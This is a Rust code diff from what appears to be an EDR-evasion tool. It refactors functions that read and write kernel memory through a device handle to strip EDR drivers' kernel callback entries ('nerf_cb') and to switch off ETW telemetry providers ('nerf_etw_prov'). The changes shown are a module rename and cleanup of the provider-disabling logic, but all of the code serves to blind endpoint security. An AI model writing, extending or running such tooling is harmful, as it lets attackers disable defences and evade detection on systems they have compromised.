@@ -13,7 +13,7 @@ use winapi::um::winnt::{
 use winapi::um::ioapiset::DeviceIoControl;
 
 use crate::mem::{self, write_qword};
-use crate::km_utils;
+use crate::km;
 
 
 // Opens a handle to the device and returns it
@@ -96,7 +96,7 @@ pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
         if value != 0 {
             let func_addr = mem::read_qword(value & 0xfffffffffffffff8)?;
             let drv_name: String;
-            match km_utils::find_driver_name_from_addr(func_addr) {
+            match km::find_driver_name_from_addr(func_addr) {
                 Some(drv) => {
                     drv_name = drv; // take ownership of the String
                 },
@@ -109,7 +109,7 @@ pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
                 "[|]   [0x{:16X}]: 0x{:16X} [{}]",
                 addr, func_addr, drv_name
             );
-            if km_utils::is_driver_name_matching_edr(&drv_name) {
+            if km::is_driver_name_matching_edr(&drv_name) {
                 println!(
                     "[|]    [0x{:16X}]: Entry matches EDR ({}). Removing...",
                     addr, drv_name
@@ -130,16 +130,13 @@ pub fn nerf_etw_prov(
 
     let reg_entry = mem::read_qword(prov_addr)?;
     let guid_entry = mem::read_qword(reg_entry + guid_offset)?;
-    let enable_info = mem::read_dword(guid_entry + prov_offset)?;
+    let mut enable_info = mem::read_dword(guid_entry + prov_offset)?;
 
     if enable_info == 0x1 {
         println!("[*] Current {} provider enabled status: 0x{:x}. Disabling!", prov_name, enable_info);
         mem::write_dword(guid_entry + prov_offset, 0x0);
-        let enable_info = mem::read_dword(guid_entry + prov_offset)?;
-        println!("[*] New {} provider enabled status: 0x{:x}", prov_name, enable_info); 
-    } else if enable_info == 0x0 {
-        println!("[+] {} provider already disabled (status: 0x{:x})!", prov_name, enable_info);
-    } else {
+        enable_info = mem::read_dword(guid_entry + prov_offset)?;
+    } else if enable_info > 0x1 {
         println!("[-] Error: {} provider is neither 0 or 1 (status: 0x{:x})", prov_name, enable_info);
     }
 
